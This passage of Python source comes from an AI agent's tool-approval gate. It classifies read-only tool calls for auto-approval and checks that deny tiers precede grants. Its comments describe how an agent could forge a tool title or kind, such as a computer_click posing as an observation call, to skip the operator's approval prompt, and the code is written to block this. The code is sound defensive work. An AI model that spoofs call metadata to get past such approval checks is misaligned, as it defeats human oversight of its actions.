    if identity_ref:
        # Runtime breadcrumb for the deliberate title-match exclusion: a pattern
        # that matches the agent-authored title does not grant an
        # identity-verified MCP call. On an unattended surface the only other
        # symptom is a card nobody answers, so say once per (pattern, identity)
        # which rewrite restores the grant.
        for pattern in facts.config.auto_approve_tools:
            if _tool_matches(pattern, call.title) or _tool_matches(pattern, facts.normalized):
                _note_title_only_grant_pattern(pattern, identity_ref)
    return None


# ── the classifier ────────────────────────────────────────────────────────────


def _tier_read_only(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """Kiro Crew's own read-only auto-approve: the LAST row of the table.

    AFTER every deny tier (deny-by-default shell, sensitive-path, sensitive-bash,
    exfil, write-protected-config, the effective deny set, the file-search target)
    and governance. Its position guarantees a read-only classification can never
    re-admit anything a tier above blocked. This re-homes the "reads don't nag" UX
    now that kiro-cli's autoAllowReadonly is retired. The ``slack.gateway`` import
    is function-local: ``slack.gateway`` imports hooks at module top, so a
    module-level import would create a boot import cycle. The bash classifier lives
    on the security surface, which the facade already imports at top, so it needs
    no such dodge.

    Every auto-approve here carries ``read_only=True``: a verdict about the call's
    EFFECT, and the only auto-approve ``ToolApprovalPolicy.READ_ONLY`` honours. The
    grant tiers stay untagged.

    Under ``classifier_only`` the classifier tightens WHAT counts as proof: with no
    approver to catch an over-approval, read-only must follow from HOST-TRUSTED
    facts alone -- the recovered shell ``command`` judged by ``is_read_only_bash``,
    or a built-in the host knows to be read-only, named by the non-model-authored
    ``mcp_tool`` with no ``mcp_server`` (``_HOST_READ_ONLY_BUILTIN_TOOLS``) AND
    carrying ``identity_trusted``, the provenance flag saying that pair came from
    the ``_meta.kiro`` parse this client made of the tool_call frame
    (``AcpEvent.mcp_identity_trusted``) rather than from an inline payload or a
    hand-built event -- without it a host-known name is unproven and refused. The
    agent-influenced inputs -- the ACP ``kind`` and the title -- may NARROW (a
    non-read kind refuses) but never prove, so a mutating tool labelled
    ``kind="read"`` or titled ``Read …`` is not auto-approved; an MCP-served tool,
    which carries no host-trusted read-only marker, is not provable either. Off the
    flag the interactive path keeps its ACP-kind allow-list and title fallback.
    """
    call = facts.call
    if call.is_shell:
        # A shell read-only classification uses the deny-by-default bash
        # classifier (rejects redirects/substitution/backgrounding). A command that
        # could not be recovered was already denied by the first tier; a present
        # command that is not read-only falls through to interactive approval.
        if call.command and is_read_only_bash(call.command):
            return ToolHookResult.auto_approve(read_only=True)
        return None
    from kiro_crew.slack.gateway import _is_read_only_tool

    kind = (call.kind or "").strip().lower()
    if facts.classifier_only:
        # READ_ONLY has no approver behind it, so a read-only verdict here
        # EXECUTES the call unattended. Under this flag the proof must come from
        # HOST-TRUSTED facts alone. The shell branch above already judges the
        # recovered command; this branch accepts only a built-in the host knows to
        # be read-only, identified by the non-model-authored ``_meta.kiro.toolName``
        # (``mcp_tool``) with no MCP server behind it, and ONLY when
        # ``identity_trusted`` says that pair came from the provenance-verified
        # caches rather than an inline payload or a hand-built event -- the absence
        # of a server name proves nothing until the pair itself is proven
        # host-stamped. The two agent-influenced inputs that reach this point prove
        # nothing: ``kind`` is the ACP ``kind`` field passed through verbatim (the
        # interactive path below keeps its existing kind allow-list, unchanged),
        # and the title is model-authored prose. Both may NARROW -- a non-read kind
        # refuses even a host-known read tool, so the two must agree -- never
        # widen. An MCP-served tool carries no host-trusted read-only marker on the
        # permission event (``readOnlyHint`` is a manifest claim nothing forwards to
        # the gate), so it is not provable here and falls to the caller's path,
        # which under READ_ONLY refuses.
        if kind and kind not in _READ_ONLY_TOOL_KINDS:
            return ToolHookResult.allow()
        if _is_host_read_only_builtin(
            call.mcp_tool, call.mcp_server, mcp_identity_trusted=call.identity_trusted
        ):
            return ToolHookResult.auto_approve(read_only=True)
        return ToolHookResult.allow()
    # Trust the SEMANTIC kind, as an ALLOW-list. ``kind`` is passed through
    # verbatim from the ACP ``kind`` field (``acp/_dispatch.py``), so it is an
    # arbitrary agent-influenced string and a DENYLIST of mutating kinds can never
    # be complete -- ``kind="other"`` is a real ACP value. Only these two spellings
    # mean "this cannot change anything".
    if kind in _READ_ONLY_TOOL_KINDS:
        return ToolHookResult.auto_approve(read_only=True)
    # Computer-use observation tools ("reads don't nag" for this feature too),
    # and they require an EXPLICIT read-only kind — reached only under the
    # branch above. Two agent-controlled inputs meet here and neither may
    # decide alone:
    #
    #   * the title (``on_tool_call``'s ``tool_name``) comes from
    #     `select_tool_title`, which prefers the LLM-authored `description`, so a
    #     mutating call can title itself `…__computer_get_state`;
    #   * an omitted `kind` is indistinguishable from an honest one.
    #
    # Keying the class lookup on the title alone therefore let a `computer_click`
    # forge an observation title, omit its kind, and skip the approval prompt
    # entirely once the operator enabled computer use — the prompt that is the
    # last thing between an injected agent and a real click on the operator's
    # desktop. Demanding the kind means the two inputs must AGREE.
    #
    # The class table is still consulted (never `_is_read_only_tool`, whose
    # leading-verb heuristic would auto-approve every `computer_*` tool or none
    # depending on the name), and it is still gated on the keystone primary
    # enable so no auto-approval can exist while the feature is off. Reached
    # only AFTER the deny floor and `_governance_denial`, so a governance deny
    # still wins. There is deliberately no approval-floor clamp to mention: the
    # `computer_use.approval` ordinal was removed with the rest of that model.
    if kind in _READ_ONLY_TOOL_KINDS and _cu_read_only_auto_approve(call.title):
        return ToolHookResult.auto_approve(read_only=True)
    # Any other non-empty kind falls through to interactive approval, whatever
    # the call titles itself. Over-blocking costs one prompt; under-blocking
    # costs the prompt.
    if kind:
        return ToolHookResult.allow()
    # Kind ABSENT: the pre-existing generic fallback, unchanged. It is safe for
    # computer use specifically because `_is_read_only_tool` matches on a
    # leading read-ish verb and rejects EVERY `mcp__kirocrew-computer__*` title
    # (verified) — so a forged computer-use title cannot reach an auto-approve
    # through this path either.
    if _is_read_only_tool(call.title):
        return ToolHookResult.auto_approve(read_only=True)
    return None


# ── the table's own soundness ─────────────────────────────────────────────────


def shell_rules(tiers: Sequence[GateTier]) -> Iterator[GateTier | GateRule]:
    """Every check of *tiers* that judges a shell command line, in table order.

    A per-target tier contributes its rules that name a ``shell_rule``; any other
    tier contributes itself when it names one. ``hooks.SHELL_DENY_TIERS`` is this
    projection of ``GATE_TIERS`` written out as a literal, so the denial
    differential can read it without importing the product.
    """
    for tier in tiers:
        if tier.rules:
            yield from (rule for rule in tier.rules if rule.shell_rule)
        elif tier.shell_rule:
            yield tier


def gate_tier_problems(tiers: Sequence[GateTier]) -> list[str]:
    """Why *tiers* is not a sound gate table, or ``[]``.

    The kinds must be monotone in ``_GATE_TIER_KINDS`` order -- every security deny
    before the policy deny, every deny before any grant, the classifier last --
    because a deny tier that moved below a grant would let the grant re-admit
    something the deny blocked. Names, rule names included, are unique, since a
    verdict's ``tier`` names the row that decided. Only a deny tier carries
    per-target rules, because a rule can only refuse.
    """
    problems: list[str] = []
    ranks = [_GATE_TIER_KINDS.index(t.kind) if t.kind in _GATE_TIER_KINDS else -1 for t in tiers]
    for tier, rank in zip(tiers, ranks):
        if rank < 0:
            problems.append(f"tier {tier.name!r} has unknown kind {tier.kind!r}")
        if tier.rules and tier.kind != "deny":
            problems.append(f"tier {tier.name!r} carries per-target rules but is {tier.kind!r}")
    for (before, rank_before), (after, rank_after) in zip(
        zip(tiers, ranks), zip(tiers[1:], ranks[1:])
    ):
        if rank_after < rank_before:
            problems.append(
                f"tier {after.name!r} ({after.kind}) runs after {before.name!r} ({before.kind})"
            )
    names = [t.name for t in tiers] + [r.name for t in tiers for r in t.rules]
    problems.extend(
        f"name {name!r} is used twice" for name in sorted({n for n in names if names.count(n) > 1})
    )
    return problems
